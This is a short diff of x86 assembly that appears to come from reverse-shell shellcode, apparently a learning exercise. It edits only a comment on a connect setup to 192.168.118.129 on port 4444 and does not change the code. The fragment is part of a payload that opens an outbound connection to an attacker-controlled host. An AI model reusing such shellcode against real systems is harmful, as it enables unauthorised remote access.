@@ -34,7 +34,7 @@ _start:
 	mov esi, eax 	      ; File descriptor for the new socket returned from last syscall (create socket)
 	pop ebx               ; To be use for SYS_CONNECT
 	xor edx, edx	      ; zero edx
-	push 0x8176a8c0	      ; client_addr INADDR_ANY --> (0.0.0.0) 0x0000000
+	push 0x8176a8c0	      ; client_addr INADDR_ANY --> (192.168.118.129) 0xc0a87681
 	push word 0x5c11      ; client_addr PORT --> (4444) 0x115c
 	push bx	     	      ; AF_INET (2)
 	mov ecx, esp	      ; ECX contains memory address that points to struct sockaddr
